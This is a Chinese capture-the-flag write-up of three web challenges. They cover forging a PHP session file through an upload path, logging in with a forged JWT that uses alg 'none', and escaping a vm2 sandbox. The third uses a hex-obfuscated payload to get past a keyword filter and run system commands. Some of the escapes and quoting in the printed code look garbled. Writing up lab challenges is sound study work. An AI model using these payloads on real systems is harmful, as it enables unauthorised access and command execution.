
# 2020 虎符网络安全竞赛 web Writeup


                                阅读量   
                                **1024279**
                            
                        |
                        
                                                                                                                                    ![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/203417/t01b9999812096855fb.png)](./img/203417/t01b9999812096855fb.png)



## 前言

4月20日 周日 天气晴<br>
这周有虎符的安全竞赛，<br>
又是菜鸡自闭的一天<br>
真神仙打架。大佬们都tql。。<br>
一共三个web题目，在这里总结一下。。



## babyupload

打开页面，发现给出了源码：

```
&lt;?php
error_reporting(0);
session_save_path("/var/babyctf/");
session_start();
require_once "/flag";
highlight_file(__FILE__);
if($_SESSION['username'] ==='admin')
{
    $filename='/var/babyctf/success.txt';
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION['username'] ='guest';
}
$direction = filter_input(INPUT_POST, 'direction');
$attr = filter_input(INPUT_POST, 'attr');
$dir_path = "/var/babyctf/".$attr;
if($attr==="private"){
    $dir_path .= "/".$_SESSION['username'];
}
if($direction === "upload"){
    try{
        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
            throw new RuntimeException('invalid upload');
        }
        $file_path = $dir_path."/".$_FILES['up_file']['name'];
        $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);
        if(preg_match('/(../|..\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
            $upload_result = "uploaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
} elseif ($direction === "download") {
    try{
        $filename = basename(filter_input(INPUT_POST, 'filename'));
        $file_path = $dir_path."/".$filename;
        if(preg_match('/(../|..\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException('file not exist');
        }
        header('Content-Type: application/force-download');
        header('Content-Length: '.filesize($file_path));
        header('Content-Disposition: attachment; filename="'.substr($filename, 0, -65).'"');
        if(readfile($file_path)){
            $download_result = "downloaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}
?&gt;
```

读代码，发现这是一个存在上传和下载文件的功能。<br>
获取flag的条件：<br>
1.`$_SESSION['username'] ==='admin')`
<li>存在`/var/babyctf/success.txt`
</li>
我们一步一步来：<br>
使`$_SESSION['username'] ==='admin')`，我们发现没有什么代码和修改这个变量值的，但是在代码开头设置了保存session文件的路径：

```
session_save_path("/var/babyctf/");
session_start();
```

通过session文件的命名规则，可以推断session文件为：`/var/babyctf/sess_XXXXX(为PHPSESSID的值)`。。

我们尝试读取一下，session文件：<br>
post：

```
direction=download&amp;filename=sess_a41c14e052970b6a0af81246c69b552d
```

内容为：

```
&lt;0x08&gt;usernames:5:"guest";
```

猜测我们只要上传一个session文件内容为：

```
&lt;0x08&gt;usernames:5:"admin";
```

并且命名为：`sess_XXXXXXXXXX`，然后设置`PHPSESSID`就可以使得`$_SESSION['username'] ==='admin')`成立了。

分析上传代码发现：

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMrBuj.png)

发现如果不上传`attr`参数，`dir_path`会直接拼接上传的文件名+`"_".hash_file("sha256",$_FILES['up_file']['tmp_name']);`

如果把上传文件名设置为`sess`，并且不传递`attr`参数，就可以得到`/var/babyctf/sess_XXXXXXXXX`，这就可以当成session文件。。

`hash_file("sha256",$_FILES['up_file']['tmp_name'])`，虽然`tmp_name`是不可控的随机值，但是`hash_file()`是根据文件内容得到的hash值。就是说文件内容可控，那么文件名就是可控的了。

在本地创建一个文件名为`sess`:

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMrzqA.png)

在本地写一个上传页面：

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form action="题目地址" method="post" enctype="multipart/form-data"&gt;
        &lt;input type="text" name="attr" /&gt;
        &lt;br&gt;
        &lt;input type="text" name="direction" /&gt;
        &lt;br&gt;
        &lt;input type="file" name="up_file" /&gt;
        &lt;br&gt;
        &lt;input type="submit" /&gt;
&lt;/body&gt;
&lt;/html&gt;
```

抓包上传文件：

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMsFG8.png)

获取上传文件的`hash_file`值

```
&lt;?php 
echo hash_file("sha256","./sess");

 ?&gt;

输出：
432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4
```

尝试读一下`sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4`看是否写成功：

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMsAxg.png)

然后就差`success.txt`了。<br>
可以把`attr`参数设置为`success.txt`。

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMsnZn.png)

可以将`success.txt`变成一个目录。从而绕过了限制。

然后将`PHPSESSID`修改为`432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4`,就可以得到flag。

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMy9OJ.png)



## easy_login

打开是一个登陆框的界面，通过题目的描述知道是一个nodejs写的网站。

查看`/static/js/app.js`源代码发现：

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/19/JMaJAO.png)

看注释静态映射到了根目录，猜测可以读取源码，访问app.js,controller.js 可以看到源码

app.js

```
const Koa = require('koa');
const bodyParser = require('koa-bodyparser');
const session = require('koa-session');
const static = require('koa-static');
const views = require('koa-views');

const crypto = require('crypto');
const { resolve } = require('path');

const rest = require('./rest');
const controller = require('./controller');

const PORT = 80;
const app = new Koa();

app.keys = [crypto.randomBytes(16).toString('hex')];
global.secrets = [];

app.use(static(resolve(__dirname, '.')));

app.use(views(resolve(__dirname, './views'), {
  extension: 'pug'
}));

app.use(session({key: 'sses:aok', maxAge: 86400000}, app));

// parse request body:
app.use(bodyParser());

// prepare restful service
app.use(rest.restify());

// add controllers:
app.use(controller());

app.listen(PORT);
console.log(`app started at port ${PORT}...`);
```

然后测试出还有`/controllers/api.js`

```
const crypto = require('crypto');
const fs = require('fs')
const jwt = require('jsonwebtoken')

const APIError = require('../rest').APIError;

module.exports = {
    'POST /api/register': async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || username === 'admin'){
            throw new APIError('register error', 'wrong username');
        }

        if(global.secrets.length &gt; 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString('hex');
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});

        ctx.rest({
            token: token
        });

        await next();
    },

    'POST /api/login': async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError('login error', 'username or password is necessary');
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError('login error', 'no such secret id');
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: 'HS256'});

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    'GET /api/flag': async (ctx, next) =&gt; {
        if(ctx.session.username !== 'admin'){
            throw new APIError('permission error', 'permission denied');
        }

        const flag = fs.readFileSync('/flag').toString();
        ctx.rest({
            flag
        });

        await next();
    },

    'GET /api/logout': async (ctx, next) =&gt; {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};
```

代码审计一下，发现是jwt加密验证。

一些jwt库支持none算法，将算法修改为none，即没有签名算法。当alg字段被修改为none时，后端若是支持none算法，后端不会进行签名验证。

做法：将header中的alg字段可被修改为none，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’） 然后直接提交到服务端去即可。。

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMwSQs.png)<br>
只要想办法令secret为undefined就可以使用none签名校验了。。

js的一些特性：

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMwohF.png)

可以让`secectid`为`0.1`来进行绕过。

先注册一个账号，抓取一下jwt进行解密。。[jwt解密链接](https://jwt.io/)

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JM0eN8.png)

网站上的不能将`alg`设置为`none`，用脚本进行加密：

```
#encoding=utf-8
import base64

def b64urlencode(data):
    return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')

print b64urlencode("{"typ":"JWT","alg":"none"}") + 
      '.' + b64urlencode("{"secretid":"0.1","username":"admin","password":"123456"}") + '.'
```

脚本生成jwt加密字符串`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IjAuMDEiLCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYifQ.`

然后尝试admin登陆，进行抓包：

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JM0u9g.png)

发现登陆成功，放包

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JM03Bq.png)

发现成功使用admin登陆了，然后点击getflag发现没有反应。。<br>
然后再次抓包得到flag..

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JM0YNT.png)



## just_escape

打开页面发现：

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JM0DD1.png)

访问`run.php`得到源码：

```
&lt;?php
if( array_key_exists( "code", $_GET ) &amp;&amp; $_GET[ 'code' ] != NULL ) {
    $code = $_GET['code'];
    echo eval(code);
} else {
    highlight_file(__FILE__);
}
?&gt;
```

天真的我，以为是php命令执行绕过。。。

尝试了一下`phpinfo()`发现：

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JM06UK.png)

再看了看提示，发现不是php。<br>
仔细看了下代码 `eval`里的`code`这个细节猜测应该是js写的，php是假象

验证后发现，code执行的确实是js的代码。。。

科学上网发现了这么一篇文章：[https://www.anquanke.com/post/id/170708?display=mobile](https://www.anquanke.com/post/id/170708?display=mobile)

访问`/run.php?code=Error().stack`得到:

```
Error
    at vm.js:1:1
    at ContextifyScript.Script.runInContext (vm.js:59:29)
    at VM.run (/usr/src/app/node_modules/vm2/lib/main.js:219:62)
    at /usr/src/app/server.js:51:33
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at /usr/src/app/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/usr/src/app/node_modules/express/lib/router/index.js:335:12)
```

发现题目设置的模块`vm.js`，然后发现对应的[vm2](https://github.com/patriksimek/vm2)仓库里已经有很多 escape 的 issue 了<br>
找到了这个 [https://github.com/patriksimek/vm2/issues/225](https://github.com/patriksimek/vm2/issues/225)

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMBfiT.png)

直接输入代码：

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMB4WF.png)

发现返回了一个键盘的页面。。

测试发现过滤了一些关键字：单引号、双引号、exec、prototype等等，会被拦截，然后返回这个键盘页面。。。

测试发现可以通过十六进制编码来进行关键字绕过：

```
(function(){TypeError[`x70x72x6fx74x6fx74x79x70x65`][`x67x65x74x5fx70x72x6fx63x65x73x73`] = f=&gt;f[`x63x6fx6ex73x74x72x75x63x74x6fx72`](`x72x65x74x75x72x6ex20x70x72x6fx63x65x73x73`)();try{Object.preventExtensions(Buffer.from(``)).a = 1;}catch(e){return e[`x67x65x74x5fx70x72x6fx63x65x73x73`](()=&gt;{}).mainModule.require((`x63x68x69x6cx64x5fx70x72x6fx63x65x73x73`))[`x65x78x65x63x53x79x6ex63`](`whoami`).toString();}})()
```

修改要执行的命令，就能得到flag了

payload:

```
(function(){TypeError[`x70x72x6fx74x6fx74x79x70x65`][`x67x65x74x5fx70x72x6fx63x65x73x73`] = f=&gt;f[`x63x6fx6ex73x74x72x75x63x74x6fx72`](`x72x65x74x75x72x6ex20x70x72x6fx63x65x73x73`)();try{Object.preventExtensions(Buffer.from(``)).a = 1;}catch(e){return e[`x67x65x74x5fx70x72x6fx63x65x73x73`](()=&gt;{}).mainModule.require((`x63x68x69x6cx64x5fx70x72x6fx63x65x73x73`))[`x65x78x65x63x53x79x6ex63`](`cat%20/flag`).toString();}})()
```

[![](./img/203417/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/20/JMDMmn.png)



## 总结

这次的web题目，学到了一些东西，做题最重要的还是细心。多查阅文档，不能轻易的放弃，要有耐心。。。。

这次比赛师傅们都tql了，神仙打架
